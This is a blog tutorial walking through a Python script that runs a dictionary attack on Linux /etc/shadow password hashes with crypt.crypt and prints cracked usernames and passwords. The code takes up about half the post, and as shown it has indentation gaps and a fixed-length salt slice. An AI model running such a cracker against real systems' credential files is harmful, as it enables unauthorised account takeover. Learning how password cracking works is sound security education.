---
layout: post
author: "Samvel Vardanyan"
title: "Cracking Linux Password"
date: 2020-10-29 21:45:00 -0700
categories: jekyll update
permelink: /:categories/:year/:month/:day/:title
---

This week we are going to make a small program to crack a linux password. This is a test project and we are going to use `Python` to write our program to crack a password. But befor we start we need the followings:

**Requirements**

- Code editor
- A dictionary
- Linux shadow file
- Basic knowledge of Python programming language

For code editor any code editor will do, in my case I'm using `VS Code`, which is a great code editor.
For dictionary we need to download a dictionary file, which has known password lists in it. In my case I have very small dictionary with 100000 passwords in it since this is just for testing purposes only. For `shadow` file we need the file that has hashed passwords for that system. It usually is in directory `/etc/shadow`. In my case the file I have called `etc_shadow` Once we have code editor installed, the `/etc/shadow` file and dictionary with known passwords in it, it's time to understand how everything works.

**How It Works**

We are going to write a code in `Python` which takes the password dictionary file, in my case it calls `100000passwords.txt` file and reads all the passwords line by line, it then encrypts it and makes a hash. Once we have a hash for that particular password, we then take `etc_shadow.txt` file read all the hashes in it and compare those hashes to the hash that we just created and if there is a match, it means we found a password, otherwise we keep doing it untill we find a match.

**Actual Code**

{% highlight ruby %}
#Hacking passwords from password dictionary - Samvel Vardanyan
import crypt

#Opening etc_shadow and 100000passwords files
#and passing them to variables
with open('etc_shadow', 'r') as user:
usernames = user.readlines()
with open('100000passwords.txt', 'r') as passwd:
hashedPasswords = passwd.readlines()

#Variable to count how many passwords were hacked
count = 0

#Variale to check for '$' in the hash
dollarSignCheck = "$"

#For loop that goes through etc_shadow file to get hashes for all the Users who has passwords set
for i in range (0, len(usernames)):

    #Checking to see if user account has password
    if dollarSignCheck  in usernames[i]:

        #spliting the hash to :
        splitHash = usernames[i].split(':')

        #getting the username
        user = splitHash[0]

        #getting password hash with salt
        hashWithSalt = splitHash[1]

        #getting only salt from hash
        salt = hashWithSalt[0:11]

        #Loop to go through 100000passwords file and checks evry password for all users
        for j in range (0, len(hashedPasswords)):

            #setting plainPassword to value of hashedPassword
            plainPassword = hashedPasswords[j]

            #stripping '\n' from end of every line
            plainPassword = plainPassword[:-1]

            #runing crypt function to hash plain passwords
            cryptWord = crypt.crypt(plainPassword, salt)

            #Condition to find match
            if cryptWord == hashWithSalt:

                #Adding 1 to count for every password match
                count += 1

                #printing final results of founded passwords
                print(count, "Password match found:", "Username:", user, "--", "Password:", plainPassword)

                #breaking out of the loop if password is for that user
                break

#printing total password matches
print("Total password matches found:", count)
{% endhighlight %}

**The Logic Behind The Code**

- First we import `crypt` module from the library.
- Then we open both files in Python using `with open`

{% highlight ruby %}
with open('etc_shadow', 'r') as user:
usernames = user.readlines()
with open('100000passwords.txt', 'r') as passwd:
hashedPasswords = passwd.readlines()
{% endhighlight %}

- Now in `etc_shadow` file we need to seperate `username`, `hash algorithm`, `password salt` and `password hash` from the hash and we do that by `.split` method.

- Once we have all that info in seperate chunks, we take `password salt` from `etc_shadow` file and `plain password` from `100000passwords.txt` and pass them to `crypt.crypt()` method:

{% highlight ruby %}
cryptWord = crypt.crypt(plainPassword, salt)
{% endhighlight %}

- We need to put all this inside of the loop, so it keeps doing int untill we reach at the end of the `100000passwords.txt` file.

- The last step is to print what we found. So if there is a match we print the password and if there was no match we print that there was nothing found.

This is actual output of the program using `100000passwords.txt` and `etc_shadow` file:

![image](/blog/assets/images/python-output.png)